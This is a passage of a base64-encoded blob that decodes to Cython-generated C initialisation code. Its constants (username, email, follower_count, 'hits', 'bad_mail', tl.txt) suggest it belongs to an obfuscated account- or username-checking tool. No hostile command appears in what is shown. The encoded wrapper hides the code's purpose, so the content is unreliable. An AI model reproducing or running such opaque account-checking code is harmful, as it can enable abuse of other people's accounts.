x0aW5zKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX3B5eF9idWlsdGluX3ByaW50ID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcHJpbnQpOyBpZiAoIV9fcHl4X2J1aWx0aW5fcHJpbnQpIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X2J1aWx0aW5fb3BlbiA9IF9fUHl4X0dldEJ1aWx0aW5OYW1lKF9fcHl4X21zdGF0ZS0+X19weXhfbl91X29wZW4pOyBpZiAoIV9fcHl4X2J1aWx0aW5fb3BlbikgX19QWVhfRVJSKDAsIDExMiwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X2J1aWx0aW5fc3VtID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc3VtKTsgaWYgKCFfX3B5eF9idWlsdGluX3N1bSkgX19QWVhfRVJSKDAsIDQzMywgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X2J1aWx0aW5faW5wdXQgPSBfX1B5eF9HZXRCdWlsdGluTmFtZShfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pbnB1dCk7IGlmICghX19weXhfYnVpbHRpbl9pbnB1dCkgX19QWVhfRVJSKDAsIDQ2MCwgX19weXhfTDFfZXJyb3IpXG5cbiAgXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9pdGVtcy50eXBlID0gKFB5T2JqZWN0KikmUHlEaWN0X1R5cGU7XG4gIF9fcHl4X21zdGF0ZS0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9pdGVtcy5tZXRob2RfbmFtZSA9ICZfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pdGVtcztcbiAgX19weXhfbXN0YXRlLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcC50eXBlID0gKFB5T2JqZWN0KikmUHlEaWN0X1R5cGU7XG4gIF9fcHl4X21zdGF0ZS0+X19weXhfdW1ldGhvZF9QeURpY3RfVHlwZV9wb3AubWV0aG9kX25hbWUgPSAmX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcG9wO1xuICBfX3B5eF9tc3RhdGUtPl9fcHl4X3VtZXRob2RfUHlEaWN0X1R5cGVfdmFsdWVzLnR5cGUgPSAoUHlPYmplY3QqKSZQeURpY3RfVHlwZTtcbiAgX19weXhfbXN0YXRlLT5fX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3ZhbHVlcy5tZXRob2RfbmFtZSA9ICZfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV92YWx1ZXM7XG4gIHJldHVybiAwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIHJldHVybiAtMTtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJfX1B5eF9Jbml0Q2FjaGVkQ29uc3RhbnRzIiwgMCk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdID0gUHlUdXBsZV9QYWNrKDMsIFB5X05vbmUsIFB5X05vbmUsIFB5X05vbmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdKSkgX19QWVhfRVJSKDAsIDY4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0pKSBfX1BZWF9FUlIoMCwgODQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMV0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzFdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF85KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSkpIF9fUFlYX0VSUigwLCA4NSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMl0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVszXSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10pKSBfX1BZWF9FUlIoMCwgODYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbM10pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzNdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV90bF90eHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSkpIF9fUFlYX0VSUigwLCAxMTIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNF0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzRdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV90bF90eHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs1XSkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNV0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2ZvbGxvd2VyX2NvdW50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbNl0pKSBfX1BZWF9FUlIoMCwgMTU0LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs2XSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3NsaWNlWzBdID0gUHlTbGljZV9OZXcoUHlfTm9uZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE2LCBQeV9Ob25lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9zbGljZVswXSkpIF9fUFlYX0VSUigwLCAxNzksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfc2xpY2VbMF0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3NsaWNlWzBdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VtYWlsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs3XSkpIF9fUFlYX0VSUigwLCAyNTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbN10pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzddKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOF0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BrLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X05fQSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOF0pKSBfX1BZWF9FUlIoMCwgMjk1LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzhdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mdWxsX25hbWUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTl9BKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs5XSkpIF9fUFlYX0VSUigwLCAyOTYsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOV0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTBdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mb2xsb3dpbmdfY291bnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8wKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMF0pKSBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEwXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTBdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTFdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tZWRpYV9jb3VudCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzExXSkpIF9fUFlYX0VSUigwLCAyOTksIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTFdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMV0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMl0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX3ByaXZhdGUsIFB5X0ZhbHNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxMl0pKSBfX1BZWF9FUlIoMCwgMzAwLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEyXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTJdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTNdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iaW9ncmFwaHksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTl9BKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxM10pKSBfX1BZWF9FUlIoMCwgMzAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzEzXSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTNdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTRdID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pc192ZXJpZmllZCwgUHlfRmFsc2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE0XSkpIF9fUFlYX0VSUigwLCAzMDIsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTRdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNF0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNV0gPSBQeVR1cGxlX1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzE1MCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50Xzk5OSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTVdKSkgX19QWVhfRVJSKDAsIDM2NiwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNV0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE1XSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE2XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTMwMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTZdKSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxNl0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE2XSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE3XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAwMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTddKSkgX19QWVhfRVJSKDAsIDM3MCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxN10pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE3XSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE4XSA9IFB5VHVwbGVfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfOTk5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOF0pKSBfX1BZWF9FUlIoMCwgMzczLCBfX3B5eF9MMV9lcnJvcilcbiAgX19QeXhfR09UUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE4XSk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMThdKTtcblxuICBcbiAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldID0gUHlUdXBsZV9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8pOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzE5XSkpIF9fUFlYX0VSUigwLCA0MDAsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMTldKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsxOV0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMF0gPSBQeVR1cGxlX1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIwXSkpIF9fUFlYX0VSUigwLCA0MTcsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjBdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMF0pO1xuXG4gIFxuICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMV0gPSBQeVR1cGxlX1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9nbSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjFdKSkgX19QWVhfRVJSKDAsIDQxOSwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMV0pO1xuICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSk7XG5cbiAgXG4gIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIyXSA9IFB5VHVwbGVfUGFjaygxLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkX21haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIyXSkpIF9fUFlYX0VSUigwLCA0MjEsIF9fcHl4X0wxX2Vycm9yKVxuICBfX1B5eF9HT1RSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbMjJdKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0pO1xuICAjaWYgQ1lUSE9OX0lNTU9SVEFMX0NPTlNUQU5UU1xuICB7XG4gICAgUHlPYmplY3QgKip0YWJsZSA9IF9fcHl4X21zdGF0ZS0+X19weXhfdHVwbGU7XG4gICAgZm9yIChQeV9zc2l6ZV90IGk9MDsgaTwyMzsgKytpKSB7XG4gICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiAgICAgIFB5X1NFVF9SRUZDTlQodGFibGVbaV0sIF9QeV9JTU1PUlRBTF9SRUZDTlRfTE9DQUwpO1xuICAgICAgI2Vsc2VcbiAgICAgIFB5X1NFVF9SRUZDTlQodGFibGVbaV0sIF9QeV9JTU1PUlRBTF9JTklUSUFMX1JFRkNOVCk7XG4gICAgICAjZW5kaWZcbiAgICB9XG4gIH1cbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fSU1NT1JUQUxfQ09OU1RBTlRTXG4gIHtcbiAgICBQeU9iamVjdCAqKnRhYmxlID0gX19weXhfbXN0YXRlLT5fX3B5eF9zbGljZTtcbiAgICBmb3IgKFB5X3NzaXplX3QgaT0wOyBpPDE7ICsraSkge1xuICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgICBQeV9TRVRfUkVGQ05UKHRhYmxlW2ldLCBfUHlfSU1NT1JUQUxfUkVGQ05UX0xPQ0FMKTtcbiAgICAgICNlbHNlXG4gICAgICBQeV9TRVRfUkVGQ05UKHRhYmxlW2ldLCBfUHlfSU1NT1JUQUxfSU5JVElBTF9SRUZDTlQpO1xuICAgICAgI2VuZGlmXG4gICAgfVxuICB9XG4gICNlbmRpZlxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAtMTtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X0luaXRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIHtcbiAgICBjb25zdCBzdHJ1Y3QgeyBjb25zdCB1bnNpZ25lZCBpbnQgbGVuZ3RoOiA5OyB9IGluZGV4W10gPSB7ezB9LHsxfSx7NDh9LHs2NX0sezM2fSx7NH0sezF9LHsxNH0sezZ9LHszNn0sezZ9LHs0fSx7OX0sezM2MH0sezl9LHs2fSx7Nn0sezh9LHs2fSx7Nn0sezZ9LHsxMX0sezExfSx7MTF9LHsxMH0sezh9LHsxfSx7MzZ9LHsxNX0sezE2fSx7NX0sezV9LHs1fSx7NX0sezV9LHs1fSx7NX0sezMyfSx7MTV9LHsxNX0sezExfSx7MTF9LHsyNX0sezExfSx7MTJ9LHsxMTF9LHsyMn0sezIyfSx7MjJ9LHsxMX0sezExfSx7MTE2fSx7MzR9LHsyMn0sezd9LHsyNH0sezN9LHs0fSx7MTM1fSx7MjV9LHsyMn0sezQ4fSx7MjJ9LHs2fSx7NjF9LHsxMn0sezEzfSx7MTV9LHsxMH0sezI2fSx7MTd9LHsxOH0sezE2fSx7MTF9LHsyNX0sezI3fSx7Mjd9LHsxN30sezIxfSx7MjB9LHsyMn0sezE5fSx7N30sezh9LHs3Mn0sezF9LHsxfSx7M30sezJ9LHszfSx7Mn0sezF9LHsxfSx7Mn0sezF9LHsxNX0sezE5fSx7OH0sezI0fSx7OH0sezQ3fSx7NDh9LHszM30sezQ3fSx7OX0sezEyfSx7MTE5fSx7NjN9LHs3fSx7NX0sezEyfSx7MTR9LHsxNH0sezZ9LHs1fSx7Mn0sezEwfSx7MTB9LHsyMH0sezEzfSx7Mjd9LHs2MH0sezU3fSx7MTA5fSx7MTMwfSx7MTI2fSx7Mjh9LHs2NX0sezIyfSx7MzB9LHsyNX0sezM3fSx7NDZ9LHsxNX0sezl9LHsxMH0sezd9LHs3Nn0sezE2fSx7MTE4fSx7MjF9LHsxMn0sezZ9LHs2fSx7MTJ9LHsxMH0sezE4fSx7OH0sezR9LHs0fSx7NH0sezF9LHs3fSx7NH0sezZ9LHsxMH0sezZ9LHs5fSx7NX0sezV9LHsxM30sezE0fSx7MjJ9LHszOX0sezExfSx7MTd9LHsxOX0sezIyfSx7MTB9LHsyMn0sezE3fSx7MjN9LHsxMH0sezl9LHsyMH0sezI0fSx7OX0sezI2fSx7NX0sezN9LHs2fSx7NH0sezJ9LHs3fSx7NH0sezV9LHs0fSx7N30sezd9LHs0fSx7Nn0sezR9LHs2fSx7MzR9LHsyMH0sezZ9LHszfSx7NX0sezExfSx7N30sezR9LHsyfSx7MTh9LHs0fSx7NH0sezV9LHs0fSx7Nn0sezZ9LHszfSx7MX0sezZ9LHsxNH0sezE0fSx7NH0sezE2fSx7NX0sezE1fSx7NH0sezEyfSx7MTN9LHsxOH0sezl9LHsyNn0sezN9LHs2fSx7OH0sezZ9LHszfSx7OX0sezV9LHsxMn0sezV9LHsxMn0sezY0fSx7Mn0sezZ9LHs2fSx7N30sezV9LHsxMX0sezZ9LHs3fSx7MTd9LHs1fSx7MTh9LHs1fSx7M30sezZ9LHsxOH0sezd9LHs1fSx7N30sezEzfSx7MTZ9LHs5fSx7MTB9LHs0fSx7NH0sezh9LHszfSx7OX0sezEwfSx7Nn0sezN9LHs3fSx7Nn0sezR9LHszfSx7NX0sezF9LHs1fSx7M30sezh9LHs5fSx7OH0sezh9LHs1fSx7NH0sezF9LHsxOX0sezI0fSx7OH0sezE0fSx7MTV9LHs0fSx7NH0sezR9LHs5fSx7OH0sezZ9LHsxNn0sezE5fSx7MTZ9LHs3fSx7M30sezExfSx7OH0sezJ9LHszfSx7Nn0sezV9LHs1fSx7NH0sezd9LHszfSx7N30sezl9LHs0fSx7NH0sezF9LHsxOH0sezE3fSx7OX0sezh9LHsxNX0sezV9LHs4fSx7MTN9LHsxMH0sezExfSx7NX0sezR9LHsxfSx7M30sezZ9LHs0fSx7NH0sezN9LHs5fSx7OH0sezV9LHsxMX0sezN9LHsxMX0sezR9LHsxM30sezEyfSx7MTB9LHsyfSx7Mn0sezR9LHs4fSx7NH0sezJ9LHsxfSx7Mn0sezR9LHs2fSx7MTR9LHsxM3